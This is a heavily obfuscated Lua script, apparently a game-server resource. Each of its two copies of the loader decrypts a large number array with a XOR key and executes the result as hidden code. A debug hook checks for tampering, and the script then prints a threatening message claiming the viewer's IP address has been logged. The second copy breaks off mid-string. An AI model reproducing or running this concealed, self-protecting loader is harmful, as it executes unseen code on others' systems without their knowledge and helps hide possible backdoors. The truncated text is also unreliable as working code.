vZVp7HPaTthxcMy9ScBUxVtB11GUbnsSePfMIg9AEtUXxSqHDWIK1O5LtszaHeGn0J; pE0WNdBgBS1TrnQEFgGDGZKrHAB3ixO7Eftkyr37qvXfSxg9aFYSbd =
wVZIKLo5CYBHkqNfmtKYAub8Pj4vwb77nhqfKrQGh84e5jGITHG5fQp6uHokQG1x54Q4sVid; t6HwDSpls3bKFeiQ18hTuur3Ys7vhj0Zg394CQbHIQfoSpleZJnu5F =
pE0WNdBgBS1TrnQEFgGDGZKrHAB3ixO7Eftkyr37qvXfSxg9aFYSbd; amDINgPNKvCYS93ww3OLPKiKijY3PLzYILc9Rma9ufmECyspjYUfJvZYj3J11dPs10kwP =
t6HwDSpls3bKFeiQ18hTuur3Ys7vhj0Zg394CQbHIQfoSpleZJnu5F; vbNMJPxJqhTmviBcwdAAdscdALBKyz8oDaGcoXaYyvKNlJJGMMJw =
amDINgPNKvCYS93ww3OLPKiKijY3PLzYILc9Rma9ufmECyspjYUfJvZYj3J11dPs10kwP; pnEMROVnt7XF6c2o6Gjbp0gqRFPc9dj5bLVVh1bNRycbjFlmhq4BQ =
vbNMJPxJqhTmviBcwdAAdscdALBKyz8oDaGcoXaYyvKNlJJGMMJw; jIclTZPF5mUwBJATS0RbwpcMIsozdzGPfSCxODchthxvXxs2666m5v81oWQaADgVpPVktFe90 =
pnEMROVnt7XF6c2o6Gjbp0gqRFPc9dj5bLVVh1bNRycbjFlmhq4BQ; pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm = function(a)
  K, F = 6774601226419013, 16384 + 6033; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; dXcyAcB0UNpJJRHY9LpFLVbvy9JKQeN9oMGYYVtyAwf7IACWhNv8FgcUhddRcUhX6ddY0jt9MB = function(b)
  co = coroutine.create(b)
  uDcbn8qRSAtdocIcYdraJPBv96Yfg6NoqlkdVLapM6PixvzcKQEAxtw53FZnhBS3jgYJb5G = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(uDcbn8qRSAtdocIcYdraJPBv96Yfg6NoqlkdVLapM6PixvzcKQEAxtw53FZnhBS3jgYJb5G, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return uDcbn8qRSAtdocIcYdraJPBv96Yfg6NoqlkdVLapM6PixvzcKQEAxtw53FZnhBS3jgYJb5G
end; fMmalEZhjrzv0h7x1ffeOOfoUzxtO4LMRhUh9hz8KuLFlDl7VhdyNqOHMCSj886h = function(f, g)
  sBccehjv76c5kGB5GqxN3byMydkXETBj2qrBp5vWetBvk4fs8jwqhv5duOCRavraeFj = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; dmkJtQhtKsNE7S7MLkJYfCB75RBcH062tUK8OSTnV1NTbcKaDnoZiEJugkoB = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; onRckIcR03xIf6mguHm8a1cc6R7S59iNYH3m1LiCFnOAvrAMA6AqQDSa = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      sBccehjv76c5kGB5GqxN3byMydkXETBj2qrBp5vWetBvk4fs8jwqhv5duOCRavraeFj(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; vsGtmkokuFTiIj5pbWZxfXcwSkgYoRiURUtU8SZ9tXI4Ievi2VHQEJDZ2 = function(p, n)
    pGlXQmyl1etfYm0tB4IjZjDgxuAJuOsO13uVwGv94X9ymh2nIDe9bLefjqN = ""
    for k, q in pairs(p) do pGlXQmyl1etfYm0tB4IjZjDgxuAJuOsO13uVwGv94X9ymh2nIDe9bLefjqN =
      pGlXQmyl1etfYm0tB4IjZjDgxuAJuOsO13uVwGv94X9ymh2nIDe9bLefjqN ..
      jIclTZPF5mUwBJATS0RbwpcMIsozdzGPfSCxODchthxvXxs2666m5v81oWQaADgVpPVktFe90
      [pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('F9') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('1C') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('D6') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('9B') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('4A') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('55')]
      [pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('C9') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('78') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('83') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('D6')](
      q) end
    ; n(pGlXQmyl1etfYm0tB4IjZjDgxuAJuOsO13uVwGv94X9ymh2nIDe9bLefjqN)
  end; dmkJtQhtKsNE7S7MLkJYfCB75RBcH062tUK8OSTnV1NTbcKaDnoZiEJugkoB(f,
    function(r) onRckIcR03xIf6mguHm8a1cc6R7S59iNYH3m1LiCFnOAvrAMA6AqQDSa(r, g,
        function(s) vsGtmkokuFTiIj5pbWZxfXcwSkgYoRiURUtU8SZ9tXI4Ievi2VHQEJDZ2(s,
            function(t) if #dXcyAcB0UNpJJRHY9LpFLVbvy9JKQeN9oMGYYVtyAwf7IACWhNv8FgcUhddRcUhX6ddY0jt9MB(jIclTZPF5mUwBJATS0RbwpcMIsozdzGPfSCxODchthxvXxs2666m5v81oWQaADgVpPVktFe90[pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('04') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('6D') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('83') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('EC')]) == 1 then if jIclTZPF5mUwBJATS0RbwpcMIsozdzGPfSCxODchthxvXxs2666m5v81oWQaADgVpPVktFe90[pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('04') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('6D') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('83') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('EC')] == jIclTZPF5mUwBJATS0RbwpcMIsozdzGPfSCxODchthxvXxs2666m5v81oWQaADgVpPVktFe90[pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('90') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('D6') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('9B') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('4A') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('1C')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if jIclTZPF5mUwBJATS0RbwpcMIsozdzGPfSCxODchthxvXxs2666m5v81oWQaADgVpPVktFe90[pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('04') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('6D') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('83') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('EC')](t) then
                    jIclTZPF5mUwBJATS0RbwpcMIsozdzGPfSCxODchthxvXxs2666m5v81oWQaADgVpPVktFe90
                        [pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('04') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('6D') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('83') .. pRhTywF6OkOCM65MT5F3c4QTGRRPf5zakzqGDZ75vRg7Ubk4Thm('EC')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; fMmalEZhjrzv0h7x1ffeOOfoUzxtO4LMRhUh9hz8KuLFlDl7VhdyNqOHMCSj886h(
{ 1098, 949, 759, 934, 1157, 641, 649, 1172, 1074, 822, 1047, 710, 979, 836, 580, 994, 1124, 834, 967, 686, 752, 938,
  830, 1135, 1132, 586, 669, 1016, 739, 738, 729, 837, 1210, 1110, 662, 1196, 961, 969, 704, 1008, 557, 825, 963, 637,
  1077, 945, 608, 758, 1027, 1034, 593, 841, 581, 1085, 914, 1174, 1160, 715, 885, 816, 716, 1112, 562, 821, 1091, 1013,
  881, 610, 1137, 1045, 783, 1142, 853, 583, 632, 966, 543, 944, 701, 687, 796, 1004, 1066, 976, 604, 952, 609, 654,
  1175, 628, 681, 674, 902, 672, 1017, 719, 607, 982, 559, 689, 680, 627, 682, 1187, 616, 810, 1131, 1071, 848, 986, 723,
  615, 748, 1140, 597, 676, 1079, 788, 678, 714, 804, 1023, 896, 977, 1048, 677, 634, 928, 992, 618, 1102, 784, 786,
  1104, 1114, 1207, 1044, 653, 1043, 903, 1049, 1146, 891, 1067, 635, 1087, 1026, 927, 857, 614, 554, 1083, 917, 862,
  750, 1165, 700, 1060, 726, 789, 1032, 1205, 589, 747, 812, 879, 565, 960, 1107, 794, 867, 1096, 798, 735, 910, 592,
  1122, 843, 911, 901, 854, 570, 940, 744, 1033, 1181, 948, 679, 851, 644, 683, 993, 888, 1209, 950, 638, 1167, 973, 605,
  718, 770, 1197, 1192, 997, 970, 1092, 877, 1031, 556, 987, 799, 792, 805, 623, 762, 727, 606, 1194, 1130, 1168, 568,
  1038, 1024, 823, 742, 886, 574, 1156, 1189, 1176, 646, 909, 769, 838, 728, 827, 988, 1158, 751, 1188, 579, 760, 869,
  906, 790, 975, 643, 624, 1201, 737, 1006, 1057, 772, 722, 764, 648, 631, 1120, 1143, 1138, 622, 1150, 1035, 1178, 849,
  576, 1050, 740, 697, 942, 880, 1080, 890, 1148, 621, 619, 1129, 947, 1144, 904, 746, 685, 773, 887, 815, 930, 761, 951,
  1001, 548, 688, 1169, 1030, 1139, 626, 932, 828, 912, 1009, 915, 599, 711, 972, 690, 1106, 699, 858, 999, 584, 921,
  1081, 981, 874, 1040, 775, 941, 925, 588, 650, 870, 1185, 544, 730, 1090, 900, 980, 1094, 894, 720, 802, 693, 595, 872,
  863, 573, 1166, 964, 1121, 939, 850, 1126, 859, 832, 671, 852, 803, 1059, 856, 1162, 1111, 793, 1183, 1082, 889, 657,
  919, 1105, 978, 954, 684, 753, 965, 1198, 1039, 668, 694, 1149, 971, 767, 847, 808, 779, 1100, 567, 549, 551, 1036,
  1155, 552, 1073, 1084, 645, 652, 824, 831, 1191, 630, 1010, 968, 629, 563, 819, 670, 1052, 613, 936, 651, 855, 1208,
  962, 905, 1164, 1058, 756, 1064, 868, 1099, 717, 985, 591, 895, 665, 943, 766, 1115, 625, 1063, 1108, 642, 1170, 953,
  771, 724, 795, 602, 955, 558, 864, 983, 754, 1202, 991, 1007, 1029, 656, 1153, 883, 959, 731, 1076, 601, 575, 706, 860,
  741, 1117, 1068, 842, 702, 1177, 1053, 845, 612, 555, 655, 1069, 564, 660, 873, 1159, 1093, 582, 673, 833, 658, 545,
  929, 1141, 998, 1015, 1095, 664, 598, 560, 897, 865, 1204, 603, 749, 791, 1200, 734, 918, 1109, 713, 818, 1089, 1151,
  861, 1163, 1152, 898, 1199, 1127, 835, 937, 745, 1018, 736, 1195, 974, 639, 1086, 777, 1203, 633, 757, 920, 1028, 882,
  820, 1042, 1020, 1113, 893, 958, 640, 826, 666, 1065, 1011, 774, 782, 1075, 1145, 1021, 876, 935, 1118, 1061, 931, 659,
  989, 546, 663, 1025, 553, 1212, 732, 743, 1051, 698, -1, 24, 15, 30, 84, 61, 92, 111, 213, 24, 24, 69, 30, 80, 83, 24,
  111, 73, 24, 182, 40, 31, 16, 124, 92, 74, 22, 133, 96, 160, 28, 111, 26, 108, 91, 93, 182, 63, 73, 75, 54, 69, 103,
  149, 56, 62, 76, 124, 177, 123, 127, 24, 178, 115, 91, 60, 116, 94, 217, 93, 83, 74, 106, 78, 14, 106, 30, 22, 22, 135,
  44, 116, 40, 4, 75, 241, 70, 3, 213, 93, 25, 9, 12, 40, 93, 71, 84, 41, 61, 60, 104, 24, 42, 89, 24, 5, 75, 65, 42, 87,
  106, 13, 89, 70, 32, 22, 31, 56, 102, 36, 106, 65, 25, 24, 106, 66, 45, 108, 9, 221, 83, 24, 63, 84, 50, 29, 15, 2, 47,
  76, 77, 75, 88, 36, 91, 112, 72, 31, 53, 21, 86, 70, 90, 29, 110, 9, 48, 22, 5, 20, 31, 106, 0, 178, 197, 92, 30, 58,
  89, 27, 35, 128, 115, 27, 69, 74, 217, 11, 72, 16, 253, 7, 17, 89, 26, 5, 65, 74, 104, 154, 58, 56, 106, 237, 109, 70,
  31, 33, 46, 32, 64, 226, 88, 84, 48, 95, 29, 36, 12, 106, 66, 54, 87, 47, 22, 70, 22, 111, 20, 49, 25, 111, 88, 13, 31,
  89, 22, 47, 4, 3, 120, 152, 85, 227, 78, 116, 26, 85, 123, 24, 44, 42, 69, 62, 75, 74, 16, 107, 196, 237, 106, 37, 3,
  250, 37, 224, 17, 25, 109, 24, 18, 89, 84, 65, 48, 245, 91, 102, 19, 107, 70, 21, 66, 103, 67, 235, 109, 250, 2, 174,
  95, 209, 6, 22, 10, 76, 8, 17, 3, 24, 30, 69, 115, 69, 78, 17, 111, 37, 58, 95, 44, 64, 21, 75, 29, 74, 4, 87, 1, 53,
  74, 73, 189, 68, 85, 31, 116, 122, 69, 121, 106, 92, 31, 65, 15, 98, 86, 80, 75, 25, 64, 90, 24, 65, 182, 31, 4, 0, 65,
  74, 25, 7, 71, 178, 102, 10, 93, 77, 42, 81, 10, 25, 64, 41, 70, 19, 99, 69, 12, 89, 119, 86, 76, 27, 98, 106, 71, 216,
  28, 86, 5, 74, 32, 55, 66, 114, 14, 21, 109, 119, 78, 53, 106, 88, 203, 123, 24, 70, 88, 2, 229, 116, 46, 44, 118, 21,
  9, 76, 60, 10, 68, 10, 71, 65, 81, 69, 28, 13, 76, 80, 25, 109, 107, 123, 132, 10, 120, 53, 75, 21, 19, 116, 25, 74,
  218, 59, 30, 25, 12, 45, 15, 66, 24, 71, 75, 106, 84, 17, 99, 8, 12, 66, 106, 80, 87, 116, 115, 43, 10, 62, 116, 89,
  77, 34, 94, 66, 58, 94, 187, 10, 92, 77, 16, 209, 78, 93, 67, 20, 79, 117, 99, 113, 21, 67, 77, 6, 88, 85, 71, 75, 94,
  16, 182, 76, 10, 69, 91, 250, 98, 92, 171, 91, 24, 66, 16, 32, 84, 3, 104, 127, 115, 115, 11, 36, 89, 136, 114, 35, 69,
  226, 2, 5, 102, 5, 116, 59, 16, 38, 37, 87, 71, 20, 252, 110, 142, 73, 67, 27, 80, 45, 216, 4, 85, 108, 58, 8, 32, 10,
  37, 83, 61, 69, 59, 80, 3, 40, 29, 11, 91, 74, 24, 75, 66, 16, 83, 12, 233, 46, 92, 13, 64, 62, 75, 99, 84, 46, 97, 22,
  83, 133, 97, 101, 71, 106, 62, 94, 111, 69, 77, 50, 4, 48, 116, 24, 72, 70, 84, 250, 2, 37, 30, 42, 7, 36, 62, 108, 14,
  11, 111, 35, 91, 99, 81, 9, 72, 66, 57, 65, 74, 41, 55, 91, 47, 58, 86, 20, 10, 106, 12, 89, 111, 110, 40, 88, 54, 50,
  103, 18, 38, 77, 33, 90, 76, 107, 71, 0, 92, 5, 21, 6, 12, 138, 86, 42, 28, 15, 82, 177, 167, 18, 194, 88, 106, 27, 31,
  35, 73, 75, 143, 21, 11, 223, 67, 50, 9, 107, 91, 24, 89, 72, 91, 111, 83, 13, 201, 83, 7, 31, 38, 132, 79 },
  "keJ5T8JasjO8yx8ebfJS9zOg8L"); s3jFMqxJzxITeMEOkKXFQA1JFq4Sb80rKaBCbYyBT2hdhOG1c75mYfyTKV5Co =
jIclTZPF5mUwBJATS0RbwpcMIsozdzGPfSCxODchthxvXxs2666m5v81oWQaADgVpPVktFe90; ehmQPK6F3qfp91xgWBWMAUW9UiEIOMa6lWTzxdPDWGSMUMp6HyDr6QNJah6xh8MN =
jIclTZPF5mUwBJATS0RbwpcMIsozdzGPfSCxODchthxvXxs2666m5v81oWQaADgVpPVktFe90; hbuu1N01BwayziC7UPIeDyn6V6cGXzQHkKJGTFzSxtciombJg9BiZd1kQUsVW36 =
ehmQPK6F3qfp91xgWBWMAUW9UiEIOMa6lWTzxdPDWGSMUMp6HyDr6QNJah6xh8MN; cdt3xLdtbZ5ekpwjfHEGlFWyqbcXLEFeZRQBFzaJHKTrypjvUBcUh6UUeek0qfM8w9WeezBvFqC =
hbuu1N01BwayziC7UPIeDyn6V6cGXzQHkKJGTFzSxtciombJg9BiZd1kQUsVW36; ucFQFnUwGMGA0nXbCYXL1zVtafI2gSu9tbbScP6yeTE0hzx7vZhvRrSGrY =
cdt3xLdtbZ5ekpwjfHEGlFWyqbcXLEFeZRQBFzaJHKTrypjvUBcUh6UUeek0qfM8w9WeezBvFqC; sDW5Za3xYWZlAVPUtYQG2RL4HXBo3zGeYY1ABaVfNwc5N6KHgWHn =
ucFQFnUwGMGA0nXbCYXL1zVtafI2gSu9tbbScP6yeTE0hzx7vZhvRrSGrY; vjM4do7sHDJH81Cxz2GDcvYmfNGlDRv7Rsne2RaiOPQzfZGTUU1eVA5Srxr =
sDW5Za3xYWZlAVPUtYQG2RL4HXBo3zGeYY1ABaVfNwc5N6KHgWHn; vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v = function(
  a)
  K, F = 7573864509165310, 16384 + 1857; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; nSU4TEOQLGzZmyMHo5pakBYjN0O0SUmGZlWDIwH0Krya6ySVPpyfC4NjrpDyzxWaVd4 = function(b)
  co = coroutine.create(b)
  mbVqMlmpjB9KoIZ36KeXEZha8jle7QeEkRhb3o6hmSOiQEl26QPY4p0s7LwI = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(mbVqMlmpjB9KoIZ36KeXEZha8jle7QeEkRhb3o6hmSOiQEl26QPY4p0s7LwI, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return mbVqMlmpjB9KoIZ36KeXEZha8jle7QeEkRhb3o6hmSOiQEl26QPY4p0s7LwI
end; tSgMwGNdZzC5zYzZtbQIK4iMdEzK6WxYCJRe4LBVD2QgwTkpMLpjb8554nhbCrSl = function(f, g)
  v8WBkLJ8d72SwfIQlOSUAUgWAT1x5LeWKLYtlbhQQpmYCLTlDQ8yZ9kPvYN0CFGVl4c = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; lSaqjpNyX5kNtYD1NP4b18JflZw4ApdQg5Sy6fKUtHSislYsHSs3M6g = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; g7eEp6kEUxRA9Z8IwknNE53zCbiKvS6SMUfFjYYLhGaN9Fn2nBXKYkUO = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      v8WBkLJ8d72SwfIQlOSUAUgWAT1x5LeWKLYtlbhQQpmYCLTlDQ8yZ9kPvYN0CFGVl4c(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; gLoEqAexdmujZIwYWcAgkY3fLQLYKApIzJjpVSonmsOVSs1Zl0t = function(p, n)
    ozdBnclB3zjIHbytVicI8Df2FY1DpyjISujvGVadyix72d2fWzzN3vtGH1dm = ""
    for k, q in pairs(p) do ozdBnclB3zjIHbytVicI8Df2FY1DpyjISujvGVadyix72d2fWzzN3vtGH1dm =
      ozdBnclB3zjIHbytVicI8Df2FY1DpyjISujvGVadyix72d2fWzzN3vtGH1dm ..
      vjM4do7sHDJH81Cxz2GDcvYmfNGlDRv7Rsne2RaiOPQzfZGTUU1eVA5Srxr
      [vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('3A') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('A5') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('CF') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('0C') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('23') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('36')]
      [vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('8A') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('A1') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('B4') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('CF')](
      q) end
    ; n(ozdBnclB3zjIHbytVicI8Df2FY1DpyjISujvGVadyix72d2fWzzN3vtGH1dm)
  end; lSaqjpNyX5kNtYD1NP4b18JflZw4ApdQg5Sy6fKUtHSislYsHSs3M6g(f,
    function(r) g7eEp6kEUxRA9Z8IwknNE53zCbiKvS6SMUfFjYYLhGaN9Fn2nBXKYkUO(r, g,
        function(s) gLoEqAexdmujZIwYWcAgkY3fLQLYKApIzJjpVSonmsOVSs1Zl0t(s,
            function(t) if #nSU4TEOQLGzZmyMHo5pakBYjN0O0SUmGZlWDIwH0Krya6ySVPpyfC4NjrpDyzxWaVd4(vjM4do7sHDJH81Cxz2GDcvYmfNGlDRv7Rsne2RaiOPQzfZGTUU1eVA5Srxr[vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('4D') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('8E') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('B4') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('F5')]) == 1 then if vjM4do7sHDJH81Cxz2GDcvYmfNGlDRv7Rsne2RaiOPQzfZGTUU1eVA5Srxr[vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('4D') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('8E') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('B4') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('F5')] == vjM4do7sHDJH81Cxz2GDcvYmfNGlDRv7Rsne2RaiOPQzfZGTUU1eVA5Srxr[vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('F9') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('CF') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('0C') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('23') .. vzh22atmv4JgMoIjeHNQUM5ivrlc1CeiSvWTg9cBnH3YLT5owlkO23P3v('A5')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\4